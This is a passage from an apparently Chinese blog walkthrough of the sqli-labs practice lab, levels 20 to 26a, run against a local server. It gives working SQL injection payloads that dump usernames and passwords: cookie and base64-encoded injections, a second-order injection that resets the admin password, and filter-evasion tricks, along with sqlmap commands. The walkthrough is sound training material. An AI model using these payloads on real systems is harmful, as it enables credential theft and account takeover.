close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/15894228024343.png" alt="15894228024343"></p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-20/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: uname=admin'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)#</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 11</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/15894229147799.png" alt="15894229147799"></p><h4 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h4><p>布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以国光这里就不演示了，下面直接演示sqlmap的注入过程吧：</p><h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><p><strong>联合查询注入</strong></p><p>如果 <code>--level</code> 设置为 <strong>2</strong> 或更高，则 sqlmap 会对 HTTP <code>Cookie</code> 请求头进行 SQL 注入测试:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-20/"</span> --cookie=<span class="string">"uname=admin"</span> -p <span class="string">"uname"</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3 --level=2</span><br></pre></td></tr></table></figure><p>当然手动通过<code>*</code>来标记注入也比较方便：<code>--cookie=&quot;uname=admin*&quot;</code></p><p><strong>报错注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-20/"</span> --cookie=<span class="string">"uname=admin*"</span>--dbms=MySQL --random-agent --flush-session --technique=E -v 3</span><br></pre></td></tr></table></figure><p><strong>布尔盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-20/"</span> --cookie=<span class="string">"uname=admin*"</span>--dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure><p><strong>延时盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-20/"</span> --cookie=<span class="string">"uname=admin*"</span>--dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure><h2 id="高级注入姿势-21-37-关"><a href="#高级注入姿势-21-37-关" class="headerlink" title="高级注入姿势 21-37 关"></a>高级注入姿势 21-37 关</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&#39;$cookee&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">        $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">        $sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">'uname'</span>, base64_encode($row1[<span class="string">'username'</span>]), time()+<span class="number">3600</span>);</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">                 <span class="comment"># 对 cookee 进行 base64 解密</span></span><br><span class="line">        $cookee = base64_decode($cookee);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        $sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">'uname'</span>, base64_encode($row1[<span class="string">'username'</span>]), time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用联合查询注入来简单演示一下吧：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-21/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: uname=c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSxwYXNzd29yZCBTRVBBUkFUT1IgMHgzYzYyNzIzZSkgRlJPTSB1c2Vycykj</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>Cookie 的 uname 参数 Base64 解码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=sqlsec&apos;) union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/1589426073817.png" alt="1589426073817"></p><h4 id="sqlmap-3"><a href="#sqlmap-3" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>手工注入问题不大，那么尝试直接使用 sqlmap 来进行联合查询注入看看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-21/"</span> --cookie=<span class="string">"uname=*"</span> --tamper=<span class="string">"base64encode"</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure><p>sqlmap 本身不会混淆发送的 payload，混淆 payload 的话可以使用 sqlmap 自带的 payload 库</p><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&quot;$cookee&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先双引号 然后直接拼接到SQL语句中</span></span><br><span class="line">$cookee1 = <span class="string">'"'</span>. $cookee. <span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的，国光这里就不再啰嗦了。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-22/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: uname=c3Fsc2VjIiB1bmlvbiBzZWxlY3QgMSwyLChTRUxFQ1QgR1JPVVBfQ09OQ0FUKHVzZXJuYW1lLHBhc3N3b3JkIFNFUEFSQVRPUiAweDNjNjI3MjNlKSBGUk9NIHVzZXJzKSM=</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>Cookie 的 uname 参数 Base64 解码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=sqlsec&quot; union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#</span><br></pre></td></tr></table></figure><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取到 id 的值</span></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 id 中的 # 和 -- 然后 替换为 空</span></span><br><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用单引号拼接 SQL</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 有查询结果:</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure><p><strong>过滤了注释符号</strong>，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3 and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>一个经典的二次注入场景，所以下面国光来单个理一下源码。</p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><ul><li><code>index.php</code></li></ul><p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p><p><img src="http://qiniuyun.lintstar.top/15895151791144.png" alt="15895151791144"></p><p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p><p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p><p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p><ul><li><code>failed.php</code></li></ul><p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p><ul><li><code>forgot_password.php</code></li></ul><p>简单提示：如果你忘记密码 请 hack it</p><ul><li><code>Logged-in.php</code></li></ul><p>登录后的信息展示，显示登录名称并且提供了修改密码的表单</p><ul><li><code>new_user.php</code></li></ul><p>创建新用户的表单页面，本文件主要存放前段代码。</p><ul><li><code>login_create.php</code></li></ul><p>创建新用户的后端代码，下面来简单理一下代码的流程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span></span><br><span class="line">username=  mysql_escape_string($_POST[<span class="string">'username'</span>]) ;</span><br><span class="line">$pass= mysql_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass= mysql_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前用户信息</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select count(*) from users where username='$username'"</span>;</span><br><span class="line">如果当前用户已经存在 无法注册</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 两次输入密码一致：</span><br><span class="line">  <span class="comment"># 将记录插入数据库中</span></span><br><span class="line">  $sql = <span class="string">"insert into users ( username, password) values(\"$username\", \"$pass\")"</span>;</span><br><span class="line">    查询完成后 重定向到首页</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    提示两次输入密码不一致</span><br></pre></td></tr></table></figure><ul><li><code>login.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录用户名和密码都被过滤了</span></span><br><span class="line">$username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br></pre></td></tr></table></figure><ul><li><code>pass_change.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 检测未登录：</span><br><span class="line">    重定向到首页</span><br><span class="line"><span class="keyword">if</span> 检测到提交表单：</span><br><span class="line">  <span class="comment"># 对 pass 都进行了过滤</span></span><br><span class="line">  $username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">    $curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">    $pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 两次密码一致:</span><br><span class="line">        <span class="comment"># 直接将 username 拼接到 SQL 语句</span></span><br><span class="line">        $sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示密码不一致 并重定向到 fail.php</span><br></pre></td></tr></table></figure><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。</p><p><strong>二次注入</strong> 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。</p><p>先看创建用户的地方：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username =  mysql_escape_string($_POST['username']) ;</span><br></pre></td></tr></table></figure><p>username 被 <code>mysql_escape_string</code> 函数过滤了，该函数的作用如下：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>再看下更新密码的核心语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$curr_pass'</span></span><br></pre></td></tr></table></figure><p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="comment"># and password='$curr_pass'</span></span><br></pre></td></tr></table></figure><p>此时就完全改变了语义，直接就修改掉了 admin 用户的密码。</p><h4 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h4><p>常见一个<code>admin&#39;#</code>开头的用户名，下面列举的几种都可以，以此类推，很灵活：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;#1</span><br><span class="line">admin&apos;#233</span><br><span class="line">admin&apos;#gg</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>注册完成后数据库的记录信息如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">| id | username      | password   |</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">| 20 | admin<span class="string">'#hacker | 111        |</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br></pre></td></tr></table></figure><p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p><p>接下来登录 <code>admin&#39;#hacker</code> 用户，然后来修改当前的密码：</p><p><img src="http://qiniuyun.lintstar.top/15901641643476.png" alt="15901641643476"></p><p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">| id | username      | password   |</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">|  8 | admin         | 233        |</span><br><span class="line">| 20 | admin<span class="string">'#hacker | 111        |</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br></pre></td></tr></table></figure><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>关键代码分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id 直接单引号拼接</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 但是 id 被如下函数过滤了</span></span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure><p>过滤了 or 和 and 关键词，但是还存在很多方法可以绕过，下面具体演示一下：</p><h4 id="双写嵌套绕过"><a href="#双写嵌套绕过" class="headerlink" title="双写嵌套绕过"></a>双写嵌套绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users)--+</span><br><span class="line">password` 写成了 `passwoorrd`，`SEPARATOR`写成`SEPARATOORR</span><br></pre></td></tr></table></figure><h3 id="符号替换"><a href="#符号替换" class="headerlink" title="符号替换"></a>符号替换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">or` -&gt; `||</span><br><span class="line">and` -&gt; `&amp;&amp;</span><br><span class="line">?id=1&apos;||extractvalue(1,concat(0x7e,database()))--+</span><br></pre></td></tr></table></figure><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的，国光这里不再啰嗦。</p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 or 和 and 大小写</span></span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 -- 和 # 注释</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);        <span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);            <span class="comment">//Strip out #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了空格</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);        <span class="comment">//Strip out spaces</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了斜线</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);        <span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure><p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p><p>过滤注释 可以使用闭合绕过</p><p>过滤了空格 可以使用如下的符号来替代：</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>%09</td><td>TAB 键(水平)</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>return 功能</td></tr><tr><td>%0b</td><td>TAB 键(垂直)</td></tr><tr><td>%a0</td><td>空格</td></tr></tbody></table><p>直接上 payload 吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&apos;%0bunion%0bselect%0b1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,passwoorrd,0x3c62723e))))x),3%0baandnd%0b&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>与 Less-26 